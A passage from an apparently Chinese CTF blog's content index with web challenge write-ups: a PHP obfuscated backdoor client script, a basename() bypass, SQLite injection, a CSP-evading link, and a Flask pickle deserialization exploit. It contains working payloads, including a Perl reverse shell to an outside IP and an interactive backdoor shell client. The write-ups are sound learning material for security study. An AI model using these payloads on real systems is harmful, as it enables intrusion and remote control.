class=\"string\">\"/_/\"</span>,<span class=\"string\">\"/-/\"</span>),<span class=\"keyword\">array</span>(<span class=\"string\">\"/\"</span>,<span class=\"string\">\"+\"</span>),$ss($s[$i],<span class=\"number\">0</span>,$e))),$k)));</span><br><span class=\"line\">\t\t\t\t$o=ob_get_contents();</span><br><span class=\"line\">\t\t\t\tob_end_clean();</span><br><span class=\"line\">\t\t\t\t$d=base64_encode(x(gzcompress($o),$k));</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">print</span>(<span class=\"string\">\"&lt;$k&gt;$d&lt;/$k&gt;\"</span>);</span><br><span class=\"line\">\t\t\t\t@session_destroy();</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>参考一个<a href=\"https://www.cnblogs.com/go2bed/p/5920811.html\" target=\"_blank\" rel=\"noopener\">PHP混淆后门的分析</a><br>直接拿的脚本，修改下参数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># encoding: utf-8</span></span><br><span class=\"line\"></span><br><span class=\"line\">from random import randint,choice</span><br><span class=\"line\">from hashlib import md5</span><br><span class=\"line\">import urllib</span><br><span class=\"line\">import string</span><br><span class=\"line\">import zlib</span><br><span class=\"line\">import base64</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import re</span><br><span class=\"line\"></span><br><span class=\"line\">def choicePart(seq,amount):</span><br><span class=\"line\">    length = len(seq)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> length == <span class=\"number\">0</span> <span class=\"keyword\">or</span> length &lt; amount:</span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">'Error Input'</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> None</span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    indexes = []</span><br><span class=\"line\">    count = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> count &lt; amount:</span><br><span class=\"line\">        i = randint(<span class=\"number\">0</span>,length<span class=\"number\">-1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> not i in indexes:</span><br><span class=\"line\">            indexes.append(i)</span><br><span class=\"line\">            result.append(seq[i])</span><br><span class=\"line\">            count += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> count == amount:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">def randBytesFlow(amount):</span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i in xrange(amount):</span><br><span class=\"line\">        result += chr(randint(<span class=\"number\">0</span>,<span class=\"number\">255</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span>  result</span><br><span class=\"line\"></span><br><span class=\"line\">def randAlpha(amount):</span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i in xrange(amount):</span><br><span class=\"line\">        result += choice(string.ascii_letters)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">def loopXor(text,key):</span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    lenKey = len(key)</span><br><span class=\"line\">    lenTxt = len(text)</span><br><span class=\"line\">    iTxt = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> iTxt &lt; lenTxt:</span><br><span class=\"line\">        iKey = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> iTxt&lt;lenTxt <span class=\"keyword\">and</span> iKey&lt;lenKey:</span><br><span class=\"line\">            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))</span><br><span class=\"line\">            iTxt += <span class=\"number\">1</span></span><br><span class=\"line\">            iKey += <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def debugPrint(msg):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> debugging:</span><br><span class=\"line\">        <span class=\"keyword\">print</span> msg</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># config</span></span><br><span class=\"line\">debugging = <span class=\"keyword\">False</span></span><br><span class=\"line\">keyh = <span class=\"string\">\"42f7\"</span> <span class=\"comment\"># $kh</span></span><br><span class=\"line\">keyf = <span class=\"string\">\"e9ac\"</span> <span class=\"comment\"># $kf</span></span><br><span class=\"line\">xorKey = keyh + keyf</span><br><span class=\"line\">url = <span class=\"string\">'http://220.249.52.133:43429/hack.php'</span></span><br><span class=\"line\">defaultLang = <span class=\"string\">'zh-CN'</span></span><br><span class=\"line\">languages = [<span class=\"string\">'zh-TW;q=0.%d'</span>,<span class=\"string\">'zh-HK;q=0.%d'</span>,<span class=\"string\">'en-US;q=0.%d'</span>,<span class=\"string\">'en;q=0.%d'</span>]</span><br><span class=\"line\">proxies = None <span class=\"comment\"># &#123;'http':'http://127.0.0.1:8080'&#125; # proxy for debug</span></span><br><span class=\"line\"></span><br><span class=\"line\">sess = requests.Session()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># generate random Accept-Language only once each session</span></span><br><span class=\"line\">langTmp = choicePart(languages,<span class=\"number\">3</span>)</span><br><span class=\"line\">indexes = sorted(choicePart(range(<span class=\"number\">1</span>,<span class=\"number\">10</span>),<span class=\"number\">3</span>), reverse=<span class=\"keyword\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">acceptLang = [defaultLang]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i in xrange(<span class=\"number\">3</span>):</span><br><span class=\"line\">    acceptLang.append(langTmp[i] % (indexes[i],))</span><br><span class=\"line\">acceptLangStr = <span class=\"string\">','</span>.join(acceptLang)</span><br><span class=\"line\">debugPrint(acceptLangStr)</span><br><span class=\"line\"></span><br><span class=\"line\">init2Char = acceptLang[<span class=\"number\">0</span>][<span class=\"number\">0</span>] + acceptLang[<span class=\"number\">1</span>][<span class=\"number\">0</span>] <span class=\"comment\"># $i</span></span><br><span class=\"line\">md5head = (md5(init2Char + keyh).hexdigest())[<span class=\"number\">0</span>:<span class=\"number\">3</span>]</span><br><span class=\"line\">md5tail = (md5(init2Char + keyf).hexdigest())[<span class=\"number\">0</span>:<span class=\"number\">3</span>] + randAlpha(randint(<span class=\"number\">3</span>,<span class=\"number\">8</span>))</span><br><span class=\"line\">debugPrint(<span class=\"string\">'$i is %s'</span> % (init2Char))</span><br><span class=\"line\">debugPrint(<span class=\"string\">'md5 head: %s'</span> % (md5head,))</span><br><span class=\"line\">debugPrint(<span class=\"string\">'md5 tail: %s'</span> % (md5tail,))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Interactive php shell</span></span><br><span class=\"line\">cmd = raw_input(<span class=\"string\">'phpshell &gt; '</span>)</span><br><span class=\"line\"><span class=\"keyword\">while</span> cmd != <span class=\"string\">''</span>:</span><br><span class=\"line\">    <span class=\"comment\"># build junk data in referer</span></span><br><span class=\"line\">    query = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i in xrange(max(indexes)+<span class=\"number\">1</span>+randint(<span class=\"number\">0</span>,<span class=\"number\">2</span>)):</span><br><span class=\"line\">        key = randAlpha(randint(<span class=\"number\">3</span>,<span class=\"number\">6</span>))</span><br><span class=\"line\">        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class=\"number\">3</span>,<span class=\"number\">12</span>)))</span><br><span class=\"line\">        query.append((key, value))</span><br><span class=\"line\">    debugPrint(<span class=\"string\">'Before insert payload:'</span>)</span><br><span class=\"line\">    debugPrint(query)</span><br><span class=\"line\">    debugPrint(urllib.urlencode(query))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># encode payload</span></span><br><span class=\"line\">    payload = zlib.compress(cmd)</span><br><span class=\"line\">    payload = loopXor(payload,xorKey)</span><br><span class=\"line\">    payload = base64.urlsafe_b64encode(payload)</span><br><span class=\"line\">    payload = md5head + payload</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># cut payload, replace into referer</span></span><br><span class=\"line\">    cutIndex = randint(<span class=\"number\">2</span>,len(payload)<span class=\"number\">-3</span>)</span><br><span class=\"line\">    payloadPieces = (payload[<span class=\"number\">0</span>:cutIndex], payload[cutIndex:], md5tail)</span><br><span class=\"line\">    iPiece = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i in indexes:</span><br><span class=\"line\">        query[i] = (query[i][<span class=\"number\">0</span>],payloadPieces[iPiece])</span><br><span class=\"line\">        iPiece += <span class=\"number\">1</span></span><br><span class=\"line\">    referer = url + <span class=\"string\">'?'</span> + urllib.urlencode(query)</span><br><span class=\"line\">    debugPrint(<span class=\"string\">'After insert payload, referer is:'</span>)</span><br><span class=\"line\">    debugPrint(query)</span><br><span class=\"line\">    debugPrint(referer)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># send request</span></span><br><span class=\"line\">    r = sess.get(url,headers=&#123;<span class=\"string\">'Accept-Language'</span>:acceptLangStr,<span class=\"string\">'Referer'</span>:referer&#125;,proxies=proxies)</span><br><span class=\"line\">    html = r.text</span><br><span class=\"line\">    debugPrint(html)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># process response</span></span><br><span class=\"line\">    pattern = re.compile(r<span class=\"string\">'&lt;%s&gt;(.*)&lt;/%s&gt;'</span> % (xorKey,xorKey))</span><br><span class=\"line\">    output = pattern.findall(html)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> len(output) == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">'Error,  no backdoor response'</span></span><br><span class=\"line\">        cmd = raw_input(<span class=\"string\">'phpshell &gt; '</span>)</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    output = output[<span class=\"number\">0</span>]</span><br><span class=\"line\">    debugPrint(output)</span><br><span class=\"line\">    output = output.decode(<span class=\"string\">'base64'</span>)</span><br><span class=\"line\">    output = loopXor(output,xorKey)</span><br><span class=\"line\">    output = zlib.decompress(output)</span><br><span class=\"line\">    <span class=\"keyword\">print</span> output</span><br><span class=\"line\">    cmd = raw_input(<span class=\"string\">'phpshell &gt; '</span>)</span><br></pre></td></tr></table></figure>\n<p>shell拿flag<br><img src=\"https://img-blog.csdnimg.cn/20200809220810512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>又是无情靠wp过活的一天~</p>\n","categories":["buu刷题"],"tags":["php混淆"]},{"title":"Zer0pts2020web复现","url":"/2020/08/06/Zer0pts2020_web/","content":"<h2 id=\"Can-you-guess-it\"><a href=\"#Can-you-guess-it\" class=\"headerlink\" title=\"Can you guess it?\"></a>Can you guess it?</h2><p>让我们猜什么东西，点击source可以得到源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'config.php'</span>; <span class=\"comment\">// FLAG is defined in config.php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (preg_match(<span class=\"string\">'/config\\.php\\/*$/i'</span>, $_SERVER[<span class=\"string\">'PHP_SELF'</span>])) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">exit</span>(<span class=\"string\">\"I don't know what you are thinking, but I won't let you read it :)\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'source'</span>])) &#123;</span><br><span class=\"line\">  highlight_file(basename($_SERVER[<span class=\"string\">'PHP_SELF'</span>]));</span><br><span class=\"line\">  <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$secret = bin2hex(random_bytes(<span class=\"number\">64</span>));</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'guess'</span>])) &#123;</span><br><span class=\"line\">  $guess = (string) $_POST[<span class=\"string\">'guess'</span>];</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class=\"line\">    $message = <span class=\"string\">'Congratulations! The flag is: '</span> . FLAG;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    $message = <span class=\"string\">'Wrong.'</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;!doctype html&gt;</span><br><span class=\"line\">&lt;html lang=<span class=\"string\">\"en\"</span>&gt;</span><br><span class=\"line\">  &lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=<span class=\"string\">\"utf-8\"</span>&gt;</span><br><span class=\"line\">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class=\"line\">  &lt;/head&gt;</span><br><span class=\"line\">  &lt;body&gt;</span><br><span class=\"line\">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class=\"line\">    &lt;p&gt;<span class=\"keyword\">If</span> your guess is correct, I<span class=\"string\">'ll give you the flag.&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;p&gt;&lt;a href=\"?source\"&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;hr&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;?php &#125; ?&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;form action=\"index.php\" method=\"POST\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;input type=\"text\" name=\"guess\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;input type=\"submit\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>定义了一个<code>$secret</code>是随机的64位字符串的十六进制，如果我们post的<code>$guess</code>参数满足<code>hash_equals($secret, $guess)</code>，则可以得到flag。</p>\n<p>php5.6版本新增了一个函数hash_equals，可防止时序攻击的字符串比较。</p>\n<blockquote>\n<p>在密码学中,时序攻击是一种侧信道攻击,攻击者试图通过分析加密算法的时间执行来推导出密码。每一个逻辑运算在计算机需要时间来执行,根据输入不同,精确测量执行时间,根据执行时间反推出密码。</p>\n<p>如果是用普通的 == 来进行比较，那么两个字符串是从第一位开始逐一进行比较的，发现不同就立即返回 false，那么通过计算返回的速度就知道了大概是哪一位开始不同的，这样就实现了电影中经常出现的按位破解密码的场景。</p>\n</blockquote>\n<p>回到题目，可以看到读取源码的地方使用了<code>basename($_SERVER[&#39;PHP_SELF&#39;])</code>，读取的是当前执行脚本的文件名，<code>index.php?source</code>读的是index.php，但把config.php加后面读的就是config.php</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806093000.png\" alt=\"\"></p>\n<p>但这里加了过滤条件<code>/config\\.php\\/*$/i</code>不允许config.php后面加参数，这里涉及到了basename的一个<a href=\"https://bugs.php.net/bug.php?id=62119\" target=\"_blank\" rel=\"noopener\">问题</a>，它会自动去掉文件名开头或者末尾的非ASCII值</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806091654.png\" alt=\"\"></p>\n<p>那么请求<code>index.php/config.php%ff?source</code>即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806092448.png\" alt=\"\"></p>\n<h2 id=\"phpNantokaAdmin\"><a href=\"#phpNantokaAdmin\" class=\"headerlink\" title=\"phpNantokaAdmin\"></a>phpNantokaAdmin</h2><p>首页是一个可以创建表的管理界面，创建表之后可以插入数据，也可以删除表</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806093330.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806093436.png\" alt=\"\"></p>\n<p>源码得知数据库是sqlite</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806100842.png\" alt=\"\"></p>\n<p>sqlite数据库中，当列名用<code>&quot; &#39; []</code>等字符隔开时，sqlite只会把这些字符包含的字符串当做列名，并且忽视后面的字符串</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806105714.png\" alt=\"\"></p>\n<p>并且sqlite可以create table … as select …，把select的查询结果放到创建的表中</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806101419.png\" alt=\"\"></p>\n<p>题目中sql语句大概是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">CREATE TABLE $table_name (dummy1 TEXT, dummy2 TEXT, &#96;$column&#96; $type);</span><br></pre></td></tr></table></figure>\n\n<p>如果我们创建表时传入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">table_name&#x3D;[aaa] as select [sql][&amp;columns[0][name]&#x3D;]from sqlite_master;&amp;columns[0][type]&#x3D;2</span><br></pre></td></tr></table></figure>\n\n<p>就相当于</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$sql &#x3D; &quot;CREATE TABLE [aaa] as select [sql][ (dummy1 TEXT, dummy2 TEXT, &#96;]from sqlite_master;&#96; 2);&quot;;</span><br></pre></td></tr></table></figure>\n\n<p><code>[sql]</code>后面的<code>[(dummy1 TEXT, dummy2 TEXT,</code>`]被忽略，就相当于</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">create table [aaa] as select sql from sqlite_master</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>SQLite数据库中有一个内置表，名为SQLITE_MASTER，此表中存储着当前数据库中所有表的相关信息，比如表的名称、用于创建此表的sql语句、索引、索引所属的表、创建索引的sql语句等。</p>\n</blockquote>\n<p>抓包修改post</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806104734.png\" alt=\"\"></p>\n<p>得到了数据库和字段名</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806104807.png\" alt=\"\"></p>\n<p>那么再接着读</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">table_name&#x3D;[aaa] as select [flag_2a2d04c3][&amp;columns[0][name]&#x3D;]from flag_bf1811da;&amp;columns[0][type]&#x3D;2</span><br></pre></td></tr></table></figure>\n\n<p>就是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$sql &#x3D; &quot;CREATE TABLE [aaa] as select [flag_2a2d04c3][ (dummy1 TEXT, dummy2 TEXT, &#96;]from flag_bf1811da;&#96; 2);&quot;;</span><br></pre></td></tr></table></figure>\n\n<p>相当于</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">create table aaa as select flag_2a2d04c3 from flag_bf1811da</span><br></pre></td></tr></table></figure>\n\n<p>同样抓包修改</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806105046.png\" alt=\"\"></p>\n<p>得到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806105105.png\" alt=\"\"></p>\n<h2 id=\"musicblog\"><a href=\"#musicblog\" class=\"headerlink\" title=\"musicblog\"></a>musicblog</h2><p>注册登录可以发post</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806112531.png\" alt=\"\"></p>\n<p>看到这个管理员会检查post以为是xss但是尝试无果，抓包发现设置了CSP无法跨域请求</p>\n<p><img src=\"https://raw.githubusercontent.com/blacknight12231/cdn/master/20200806113824.png\" alt=\"img\"></p>\n<p>测试标签只允许audio其他一概过滤，但在audio里加上<code>/</code>后，发现<code>/</code>会被替换称空格，audio标签会被自动隔断从而<code>/</code>前面的内容在html内形成<code>&lt;a&gt;</code>标签</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806115104.png\" alt=\"\"></p>\n<p>也就可以构造超链接，而超链接是不受CSP影响的，所以我们构造一个超链接让bot管理员点击，就达到了目的</p>\n<p>构造</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;a&#x2F;udio id&#x3D;like href&#x3D;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1cap6um1&gt;blacknight</span><br></pre></td></tr></table></figure>\n\n<p>post上去之后</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;a udio id&#x3D;like href&#x3D;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1cap6um1&gt;blacknight</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806115628.png\" alt=\"\"></p>\n<p>得到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806115707.png\" alt=\"\"></p>\n<p>看别的师傅的wp应该是这里bot检查脚本用了strip_tags函数，存在<a href=\"https://bugs.php.net/bug.php?id=78814\" target=\"_blank\" rel=\"noopener\">漏洞</a></p>\n<h2 id=\"notepad\"><a href=\"#notepad\" class=\"headerlink\" title=\"notepad\"></a>notepad</h2><p>一个简化的文本编辑器</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806120444.png\" alt=\"\"></p>\n<p>源码404页面的referer处存在模板注入</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">page_not_found</span><span class=\"params\">(error)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\" Automatically go back when page is not found \"\"\"</span></span><br><span class=\"line\">    referrer = flask.request.headers.get(<span class=\"string\">\"Referer\"</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> referrer <span class=\"keyword\">is</span> <span class=\"literal\">None</span>: referrer = <span class=\"string\">'/'</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> valid_url(referrer): referrer = <span class=\"string\">'/'</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    html = <span class=\"string\">'&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Refresh\" content=\"3;URL=&#123;&#125;\"&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;'</span>.format(referrer)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> flask.render_template_string(html), <span class=\"number\">404</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806130736.png\" alt=\"\"></p>\n<p>查看得到secert_key</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806131026.png\" alt=\"\"></p>\n<p>但由于源码处队url做了长度限制，不能更进一步利用</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">valid_url</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\" Check if given url is valid \"\"\"</span></span><br><span class=\"line\">    host = flask.request.host_url</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> url.startswith(host): <span class=\"keyword\">return</span> <span class=\"literal\">False</span>  <span class=\"comment\"># Not from my server</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> len(url) - len(host) &gt; <span class=\"number\">16</span>: <span class=\"keyword\">return</span> <span class=\"literal\">False</span> <span class=\"comment\"># Referer may be also 404</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\n\n<p>解密session有个savedata</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806131906.png\" alt=\"\"></p>\n<p>源码查看savedata会被base64解码。然后反序列化</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">load</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\" Load saved notes \"\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        savedata = flask.session.get(<span class=\"string\">'savedata'</span>, <span class=\"literal\">None</span>)</span><br><span class=\"line\">        data = pickle.loads(base64.b64decode(savedata))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        data = [&#123;<span class=\"string\">\"date\"</span>: now(), <span class=\"string\">\"text\"</span>: <span class=\"string\">\"\"</span>, <span class=\"string\">\"title\"</span>: <span class=\"string\">\"*New Note*\"</span>&#125;]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br></pre></td></tr></table></figure>\n\n<p>有了secert_key，可以伪造一个shell进去</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__reduce__</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">         <span class=\"keyword\">return</span> (os.system,(<span class=\"string\">\"\"\"perl -e 'use Socket;$i=\"174.2.214.12\";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;'\"\"\"</span>,))</span><br><span class=\"line\">a = A()</span><br><span class=\"line\">print(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure>\n\n<p>由于key包含不可见字符，先python用encodeBytes处理一下再伪造时base64解码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806182400.png\" alt=\"\"></p>\n<p>然后访问note/1触发</p>\n<p>nc，perl都试了还是弹不到。。。结合其他师傅的wp搞了好久。。。今天心态有点爆炸，过几天来看看</p>\n","categories":["CTF"],"tags":["CSP","ssti","sqlite"]},{"title":"NPUCTF2020web部分复现","url":"/2020/07/12/NPUCTF2020_web/","content":"<p>还有一个node和cbc字节翻转我这个菜鸡水平看不懂。。。。以后补上</p>\n<a id=\"more\"></a>\n\n<h3 id=\"ReadlezPHP\"><a href=\"#ReadlezPHP\" class=\"headerlink\" title=\"ReadlezPHP\"></a>ReadlezPHP</h3><p>打开靶机源码处发现页面</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711153556.png\" alt=\"\"></p>\n<p>打开页面得到源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">#error_reporting(0);</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HelloPhp</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $a;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $b;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;a = <span class=\"string\">\"Y-m-d h:i:s\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;b = <span class=\"string\">\"date\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $a = <span class=\"keyword\">$this</span>-&gt;a;</span><br><span class=\"line\">        $b = <span class=\"keyword\">$this</span>-&gt;b;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $b($a);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$c = <span class=\"keyword\">new</span> HelloPhp;</span><br><span class=\"line\"></span><br><span class=\"line\"><span 